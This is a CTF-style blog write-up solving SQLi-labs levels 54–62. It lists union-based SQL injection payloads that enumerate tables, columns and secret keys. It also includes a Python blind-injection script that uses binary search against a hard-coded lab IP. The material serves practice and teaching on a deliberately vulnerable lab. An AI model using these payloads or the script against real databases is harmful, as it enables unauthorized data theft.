---
title: SQLi-labs Challenges
tags:
  - SQLi
  - Writeup
  - CTF
date: 2019-05-26 09:17:00
---



## Less 54 



Description: GET / challenge / Union / 10 queries allowed / Variation 1

![](/assets/images/move/1558833874853-dba3a71f-fbdb-4ae6-bf64-d6bbb7f496a2.png)

要求从challenges数据库中获取secret_key，限制了查询次数为10。

```sql
#1.判断闭合方式 -> 单引号闭合
id=1' or '1'='1
#2.获取表名 -> PSYFDRBQFS
union select 1,group_concat(table_name),3 from information_schema.tables \
where table_schema='challenges'#
#3.获取字段名 -> id,sessid,secret_HOGR,tryy
union select 1,group_concat(column_name),3 from information_schema.columns \ 
where table_name='PSYFDRBQFS'#
#4.获取secret字段 -> YsqNLf4769SUGQm7HDdyNjRP
union select 1,group_concat(secret_HOGR),3 from PSYFDRBQFS#
```



## Less 55

Description: GET / challenge / Union / 14 queries allowed / Variation 2

1.判断闭合方式

```bash
id=1' --+
id=1" --+
id=1 --+
id=1) --+ //correct
id=1') --+
id=1") --+
```

2.常规查询

```bash
#1.table_name -> A8OVY3542N
-1) union select 1,group_concat(table_name),3 from information_schema.tables \
where table_schema='challenges'--+
#2.column_name -> secret_XXQ0
-1) union select 1,group_concat(column_name),3 from information_schema.columns \
where table_name='A8OVY3542N'--+
# secret_key -> tDKqoseQXitElBSv7SsW3XLv
-1) union select 1,group_concat(secret_XXQ0),3 from A8OVY3542N--+
```



Less 56-61基本上都是闭合方式上的区别，常见的闭合方式有`'`、`"`、`)`、`')`、`")`、`'))`等。



## Less 62

Description: GET / challenge / Blind / 130 queries allowed / variation 1

经探测闭合方式为单引号`')`，限制查询次数为130的盲注，这里使用二分法进行注入。(130次不够，逃~



```python
# -*- coding: utf-8 -*-
import time
import requests
from urllib.parse import quote_plus

main_url = 'http://43.247.91.228:84/Less-62/?id='

correct = 'Your Login name : Angelina'

# payload
table_name_ = '1\') and ascii(substr((select group_concat(table_name) '\
    'from information_schema.tables where table_schema=\'challenges\'),%d,1))%s%d#'



def check(query_string):
    url = main_url + quote_plus(query_string)
    html = requests.get(url)
    if correct in html.text:
        return True
    else:
        return False

def search(payload):
    print('[*]' + payload)
    result = ''
    print('[~]', end = '')
    for i in range(1, 100):
        left = 33
        right = 127
        #binary search
        while left <= right:
            mid = (left + right) // 2
            s = payload % (i, '=', mid)
            if check(s):
                result += chr(mid)
                print(chr(mid), end = '')
                break
            else:
                s = payload % (i, '>', mid)
                if check(s):
                    left = mid + 1
                else:
                    right = mid - 1
        if left > right:
            break
    print()
    return result

if __name__=="__main__":
    table_name = search(table_name_)
```

剩余关卡主要区别也就在于闭合方式的不同，不多赘述，整体把SQLi-labs刷下来感觉没有预期的那么难，很关卡也只是同种类型做了微小的改变(如闭合方式)，都是一些基础题目，适合新手入门学习~